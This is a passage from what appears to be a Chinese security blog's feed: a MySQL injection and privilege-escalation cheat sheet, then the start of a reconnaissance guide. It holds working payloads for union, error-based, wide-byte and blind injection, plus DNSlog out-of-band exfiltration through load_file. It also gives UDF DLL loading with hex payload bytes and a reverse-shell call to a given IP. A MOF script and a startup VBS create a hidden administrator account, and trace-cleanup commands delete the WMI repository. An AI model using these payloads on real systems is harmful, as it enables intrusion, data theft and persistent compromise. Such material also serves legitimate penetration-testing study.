class="line">&#123;identifier expr&#125;</span><br><span class="line">select &#123;x 1&#125; from &#123;x test&#125; limit 1;</span><br></pre></td></tr></table></figure></li></ul><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>union是用于合并两个sql查询结果的语句，要使用union必须有相同的列数 、必须有两条以上的select语句组成、列的数据类型必须兼容，兼容的含义是必须数据库可以隐含转换他们的类型。</p><ul><li><p>联合查询注入的主要步骤为：</p><ul><li><p>1.判断是否存在可疑的注入点(数字型或字符型)。<br>  *数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符型一般需要使用单引号来闭合。</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">方法一: 单引号法: &#39;</span><br><span class="line">方法二: 逻辑法</span><br><span class="line">and 1&#x3D;1</span><br><span class="line">and 1&#x3D;2</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">1&#39; and &#39;1&#39;&#x3D;&#39;2</span><br><span class="line">方法三:运算法</span><br><span class="line">-1</span><br><span class="line">-0</span><br></pre></td></tr></table></figure></li><li><p>2.猜解表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常见敏感表名</span><br><span class="line"></span><br><span class="line">admin</span><br><span class="line">user admin_userinfo</span><br><span class="line">system</span><br><span class="line">vipuser</span><br><span class="line">a_admin</span><br><span class="line">xxx_admin </span><br></pre></td></tr></table></figure></li><li><p>3.猜字段数：order by </p></li><li><p>4.猜解字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">敏感字段名:</span><br><span class="line"></span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">admin_usernmae</span><br><span class="line">admin_password </span><br></pre></td></tr></table></figure></li><li><p>5.获取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id &#x3D; 1 union select 1,2,3，&#39;&#39;&#39;&#39;&#39;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>注</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">当mysql 版本小于4.0 的时候 ，是不支持 union seletc联合查询的 </span><br><span class="line">当mysql 版本大于5.0时，有个默认数据库information_schema，保存了 Mysql服务器所有数据库的信息,如数据库名，数据库的表， 表栏的数据类型与访问权限等。该数据库拥有⼀个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库</span><br><span class="line">列举几个常见的查询函数</span><br><span class="line"></span><br><span class="line">1.version()- 数据库版本</span><br><span class="line">2.user() -数据库用户</span><br><span class="line">3. database() - 当前所在数据库</span><br><span class="line">4. current_user() - 当前用户名</span><br><span class="line">5. system_user() - 系统用户名</span><br><span class="line">6. session_user() -连接到数据库的用户名</span><br><span class="line">7. @@basedir - 数据库的安装目录</span><br><span class="line">8. @@datadir - 数据库文件存放目录</span><br><span class="line">9. SCHEMATA-  记录当前数据库服务器所有数据库名称</span><br><span class="line">10.TABALES-   记录了当前数据库服务器所有表的信息</span><br></pre></td></tr></table></figure><h2 id="MYSQL报错注入"><a href="#MYSQL报错注入" class="headerlink" title="MYSQL报错注入"></a>MYSQL报错注入</h2><p>常见payload如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">2.updatexml() &#x2F;&#x2F;5.1.5</span><br><span class="line">and 1&#x3D;(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">3.extractvalue() &#x2F;&#x2F;5.1.5</span><br><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br><span class="line"></span><br><span class="line">4.exp() &#x2F;&#x2F;5.5.5版本之后可以使用</span><br><span class="line">select host from user where user &#x3D; &#39;root&#39; and Exp(~(select * from (select version())a));</span><br><span class="line"></span><br><span class="line">5.name_const &#x2F;&#x2F;支持老版本</span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line"></span><br><span class="line">6.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</span><br><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入,例如说PHP的编码为 UTF-8而MySql的编码设置为了SET NAMES ‘gbk’ 或是 SET character_set_client =gbk，这样配置会引发编码转换从而导致的注入漏洞。<br>这里要说明一小点的是：<br>SET NAMES ‘x’语句与这三个语句等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;x;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;x;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;x;</span><br></pre></td></tr></table></figure><p>也就是说你设置了 SET NAMES ‘x’ 时就等于同时执行了上面的3条语句</p><p>实际上宽字节注入就是PHP发送请求到MySql时使用了语句SET NAMES ‘gbk’ 或是SET character_set_client =gbk 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节注入。</p><ul><li>宽字节注入原理<ul><li>原理可参考：<a href="https://xz.aliyun.com/t/1719">https://xz.aliyun.com/t/1719</a></li><li>在我们正常情况下使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，黑客们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（&#39;）&#x3D; （\&#39;）</span><br><span class="line">双引号（&quot;） &#x3D; （\&quot;）</span><br><span class="line">反斜杠（\） &#x3D; （\\）</span><br></pre></td></tr></table></figure></li><li>MYSQL client链接编码：假如这个网站有宽字节注入那么我们提交：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;unicodeSqlTest?id&#x3D;%df%27</span><br></pre></td></tr></table></figure>这时,假如我们现在使用的是addslashes来过滤,那么就会发生如下的转换过程:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(数据库GBK)&#x3D;&#x3D;&#x3D;&gt;運&#39;</span><br></pre></td></tr></table></figure>前端输入%df%27时首先经过上面addslashes函数转义变成了%df%5c%27（%5c是反斜杠)，之后在数据库查询前因为设置了GBK编码，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。然后MySQL服务器就会对查询语句进行GBK编码即是%df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。</li><li>MYSQL iconv函数 mb_convert_encoding函数：<br>借用先知: $id =iconv(‘GBK’,’UTF-8’, $id)<br>%df%27===(addslashes)===&gt;%df%5c%27===(iconv)===&gt;%e5%5c%5c%27<br>其实就是 utf8 -&gt; gbk -&gt;utf-8 低位的%5c 也就是反斜杠干掉了转义单引号的反斜杠。</li><li>Big5编码导致的宽字节注入：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜测代码: iconv(&#39;utf-8&#39;,&#39;BIG5&#39;,$_GET[&#39;id&#39;])</span><br><span class="line">payload构造同上: 功&#39; -&gt; addsalshes -&gt; 功\&#39; -&gt; iconv -&gt; %A5%5C%5C%27-&gt;¥\&#39; 逃逸单引号%E8%B1%B9&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息，只返回”Right”与”Wrong”，这里可以构造语句，来判断数据库语句的正确性，通过页面的“真”和“假”来识别我们的判断是否正确，“真”和“假”可以从返回页面，数据包长度，返回码等信息判断</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>left()函数</td><td>left(database(),1)&gt;’s’ database()显示数据库名称，left(a,b)从左侧截取a的前b位</td></tr><tr><td>regexp</td><td>select user() regex ‘^r’ 正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式</td></tr><tr><td>like</td><td>select user() like ‘ro%’ 与regexp相似，使用like进行匹配</td></tr><tr><td>substr()函数 ascii()函数</td><td>ascii(substr((select database()),1,1))=98 substr(a,b,c)从b位置开始，截取字符串a的长度，ascii()将某个字符转换为ascii值</td></tr><tr><td>ord()函数 mid()函数</td><td>ord(mid((select user()),1,1))=114 mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，将字符转换为ascii值</td></tr></tbody></table><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>代码存在sql注入漏洞，但页面即不会回显数据，也不会回显错误信息，语句执行也不提示真假，不能通过页面的内容来进行判断，这里可通过构造语句，通过页面响应的时长，来判断信息，即时间盲注。</p><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(left(user(),1)&#x3D;&#39;a&#39;,0,sleep(3))    #(user(),1)&#x3D;&#39;a&#39;处替换sql语句</span><br><span class="line">if(sascii(substr(database(),1,1))&gt;115,0,sleep(5))%23  #(database(),1,1)和115处为替换sql语句</span><br></pre></td></tr></table></figure><h2 id="DNSlog-SQL盲注"><a href="#DNSlog-SQL盲注" class="headerlink" title="DNSlog SQL盲注"></a>DNSlog SQL盲注</h2><p>在mysql中load_file 会带dns查询请求<br>具体可以参考 mysql带外攻击 out of band 安全客有这篇文章<br>首先查看变量确定权限<br>show variables like ‘%secure%’</p><p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p><p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p><p>3、当secure_file_priv为null，load_file就不能加载文件。</p><p>在mysql 5.5.34版本默认为空可以加载文件 但是之后版本为NULL会禁用函数但是<br>可以通过mysql的配置文件my.ini添加行进行配置<br>unc路径 网络共享文件方式 \xq17.com\tet这样的路径<br>用4个\是因为转义 本质是:<br>最好进行加密处理 防止特殊字符导致失败 如下<br>select load_file(concat(0x5c5c5c5c,version(),0x2E66326362386131382E646E736C6F672E6C696E6B2F2F616263));<br>坑点:之前一直用bugscan的dnslog 用<br>select load_file(‘\\‘,version(),’.dnslog地址’) 发现一直收不到信息<br>注意一般分配给我们的是二级域名所以我们要有个点 把返回信息放在三级域名那里 后来用16进制加密之后就发现可以了 可能是传输的时候出现了@之类什么奇怪的字符 导致了传输失败<br>总结:</p><p>1.对数据能加密尽量加密</p><p>2.dns解析 能很好解决盲打盲注的不可知的缺陷</p><p>3.缺点是:限制比较多</p><p>参考：<a href="https://www.t00ls.net/thread-44273-1-1.html">https://www.t00ls.net/thread-44273-1-1.html</a></p><p>工具：<a href="https://xz.aliyun.com/t/2359%E3%80%81https://github.com/ADOOO/DnslogSqlinj">https://xz.aliyun.com/t/2359、https://github.com/ADOOO/DnslogSqlinj</a></p><p>sqlmap：<a href="https://www.cnblogs.com/backlion/p/8984121.html">https://www.cnblogs.com/backlion/p/8984121.html</a></p><p>其他利用：<a href="https://www.freebuf.com/column/184587.html">https://www.freebuf.com/column/184587.html</a></p><h2 id="MYSQL-命令执行"><a href="#MYSQL-命令执行" class="headerlink" title="MYSQL 命令执行"></a>MYSQL 命令执行</h2><ul><li><p>UDF提权</p><p>  UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 由于是用户自定义的函数，所以我们可以利用UDF创建一个执行命令的函数。</p><p>  Secure_file_priv：secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。通过执行SHOW VARIABLES LIKE “secure_file_priv”;查看secure-file-priv的状态。</p><p>  1、当secure_file_priv的值为null ，表示限制mysql不允许导入导出。</p><p>  2、当secure_file_priv的值为/tmp/ ，表示限制mysql的导入导出只能发生在/tmp/目录下。</p><p>  3、当secure_file_priv的值没有具体值时，表示不对mysql的导入导出做限制。</p><ul><li>UDF提权条件：<ul><li>mysql &lt; 5.0，导出路径随意。</li><li>5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)。</li><li>mysql &gt; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</li><li>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</li><li>拥有可以将udf.dll写入相应目录的权限。</li></ul></li><li>实战步骤：<ul><li>查看  secure_file_priv  的值<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br></pre></td></tr></table></figure></li><li>查看系统架构以及plugin目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;             #查看主机版本及架构</span><br><span class="line">show variables like &#39;plugin%&#39;;               #查看 plugin 目录</span><br></pre></td></tr></table></figure></li><li>Sqlmap目录下找到对应的dll文件：Sqlmap将原本的dll文件进行了编码处理,我们需要通过脚本进行解密获得dll文件。（脚本位置/usr/share/sqlmap/extra/cloak/） 执行python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_进行dll_文件的解码，获得dll文件。</li><li>通过查询语句将dll上传到目标服务器上。路径具体参考udf提权条件（这里演示5.0 &lt;= mysql &lt; 5.1）。执行语句select 0xcode into dumpfile ‘C:\Windows\System32\cooltige.dll’。（写入方法也有select unhex(十六进制)、select char(77,90,144…)）。</li><li>将udf.dll 文件写入数据库：<ul><li>1、远程加载：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load_file() 函数支持远程加载，配合 dumpfile 实现写入lib 目录下一定要有 plugin 文件夹否则报错</span><br><span class="line">select load_file(&#39;C:\Python27\sqlmap\data\udf\mysql\windows\64&#39;) into dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></li><li>2、本地写入：  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table temp(data longblob);</span><br><span class="line">insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);</span><br><span class="line">update temp set data &#x3D; concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);</span><br><span class="line">select data from temp into dumpfile &quot;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></li></ul></li><li>通过dll文件创建函数。CREATE FUNCTION sys_eval RETURNS STRING SONAME ‘udf.dll’。</li><li>创建成功后就可以直接执行命令：select sys_eval(‘whoami’);</li><li>删除创建的函数DROP FUNCTION sys_eval;</li></ul></li></ul></li><li><p>反弹端口提权<br>实际上这是 UDF 提权的另一种用法，只是这里的动态链接库被定制过的，功能更多更实用一些</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell        # 执行cmd</span><br><span class="line">downloader      # 下载者,到网上下载指定文件并保存到指定目录</span><br><span class="line">open3389        # 通用开3389终端服务,可指定端口(不改端口无需重启)</span><br><span class="line">backshell       # 反弹Shell</span><br><span class="line">ProcessView     # 枚举系统进程</span><br><span class="line">KillProcess     # 终止指定进程</span><br><span class="line">regread         # 读注册表</span><br><span class="line">regwrite        # 写注册表</span><br><span class="line">shut            # 关机,注销,重启</span><br><span class="line">about           # 说明与帮助函数</span><br></pre></td></tr></table></figure></li></ul><p>反弹端口提权udf链接：<a href="https://github.com/Geekby/langouster_udf">https://github.com/Geekby/langouster_udf</a><br>导入 dll 动态链接库（这里偷懒就忽略了），然后创建自定义函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;</span><br><span class="line">select backshell(&quot;10.20.24.244&quot;, 2333);</span><br></pre></td></tr></table></figure><ul><li><p>MOF 提权<br>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是C:/Windows/system32/wbem/mof/目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><ul><li>上传 mof 文件执行命令,mof 脚本的内容如下：</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd &#x2F;add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker &#x2F;add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>MySQL 写文件的特性将这个 MOF 文件导入到 C:/Windows/system32/wbem/mof/ 目录下，依然采用上述编码的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select 0xinto dumpfile &quot;C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof&quot;;</span><br></pre></td></tr></table></figure><p>执行成功的的时候，test.mof 会出现在：c:/windows/system32/wbem/goog/ 目录下 否则出现在 c:/windows/system32/wbem/bad 目录下</p><p>痕迹清理：因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 停止 winmgmt 服务</span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"># 删除 Repository 文件夹</span><br><span class="line">rmdir &#x2F;s &#x2F;q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"># 手动删除 mof 文件</span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof &#x2F;F &#x2F;S</span><br><span class="line"></span><br><span class="line"># 删除创建的用户</span><br><span class="line">net user hacker &#x2F;delete</span><br><span class="line"></span><br><span class="line"># 重新启动服务</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure><h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>这种提权也常见于 Windows 环境下，当 Windows 的启动项可以被 MySQL 写入的时候可以使用 MySQL 将自定义脚本导入到启动项中，这个脚本会在用户登录、开机、关机的时候自动运行。</p><ul><li><p>启动项路径</p></li><li><p>Windows Server 2003 的启动项路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">中文系统</span><br><span class="line">C:\Documents and Settings\Administrator\「开始」菜单\程序\启动</span><br><span class="line">C:\Documents and Settings\All Users\「开始」菜单\程序\启动</span><br><span class="line"></span><br><span class="line">英文系统</span><br><span class="line">C:\Documents and Settings\Administrator\Start Menu\Programs\Startup</span><br><span class="line">C:\Documents and Settings\All Users\Start Menu\Programs\Startup</span><br><span class="line"></span><br><span class="line">开关机项 需要自己建立对应文件夹</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Startup</span><br><span class="line">C:\WINDOWS\system32\GroupPolicy\Machine\Scripts\Shutdown</span><br></pre></td></tr></table></figure></li><li><p>Windows Server 2008 的启动项路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure></li><li><p>既然知道路径的话就往启动项路径里面写入脚本吧，脚本支持 vbs 和 exe 类型，可以利用 vbs 执行一些 CMD 命令，也可以使用 exe 上线 MSF 或者 CS 这方面还是比较灵活的。下面是一个执行基础命令的 VB 脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set WshShell&#x3D;WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">WshShell.Run &quot;net user hacker P@ssw0rd &#x2F;add&quot;, 0</span><br><span class="line">WshShell.Run &quot;net localgroup administrators hacker &#x2F;add&quot;, 0</span><br></pre></td></tr></table></figure></li><li><p>MySQL 写入启动项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql &gt; select 0x536574205773685368656C6C3D575363726970742E4372656174654F626A6563742822575363726970742E5368656C6C22290A5773685368656C6C2E52756E20226E65742075736572206861636B6572205040737377307264202F616464222C20300A5773685368656C6C2E52756E20226E6574206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F616464222C20300A into dumpfile &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.vbs&quot;;</span><br><span class="line">写入成功的时候就等待系统用户重新登录，登录成功的话，我们的自定义脚本也就会被执行。</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全-信息收集</title>
      <link href="2021/04/18/Web%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>2021/04/18/Web%E5%AE%89%E5%85%A8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>在平常的渗透测试的过程中，最重要也是最首要的一步就是信息收集，在这个阶段我们要尽可能的收集目标组织的信息，所谓“知己知彼、百战不殆”，我们越是了解目标，渗透起来就越容易。</p><h2 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h2><ul><li>whois 查询<ul><li>whois是一个标准的互联网协议，可用于收集网络注册信息，域名的注册、IP地址等信息。可以用于查询域名是否已被注册以及注册域名的详细信息的数据库（域名所有人、域名注册商等）。在whois查询中，得到注册人的姓名和邮箱可以用于后期通过搜索引擎、社交网站爆破字典等，一般的小站点域名的所有人往往就是管理员。</li><li>kali系统下whois默认安装：whois example.domain<br><img src="/images/pasted-0.png" alt="upload successful"></li><li>爱站工具网：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></li><li>站长之家：<a href="https://whois.chinaz.com/">https://whois.chinaz.com</a></li><li>VirusTotal：<a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li></ul></li><li>备案信息查询<ul><li>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com</a></li><li>天眼查：<a href="http://www.tianyancha.com/">http://www.tianyancha.com</a></li></ul></li></ul><h2 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h2><ul><li>Google搜索敏感信息<br><img src="/images/pasted-1.png" alt="upload successful"></li><li>GitHub搜索敏感信息：寻找相关敏感信息，如数据库连接信息、邮箱密码、uc-key、阿里的osskey，有时还可以找到泄露的源代码等</li><li>乌云等漏洞平台搜索历史漏洞信息</li><li>云盘搜索：<a href="https://www.chaonengsou.com/">https://www.chaonengsou.com/</a></li></ul><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul><li>oneforall：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a> （需配置api接口，运行时翻墙效果最佳）</li><li>Layer子域名挖掘机：<a href="https://www.webshell.cc/6384.html">https://www.webshell.cc/6384.html</a></li><li>Sublist3r：<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li><li>subDomainBrute：<a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></li><li>在线子域名枚举：<a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a> 、<a 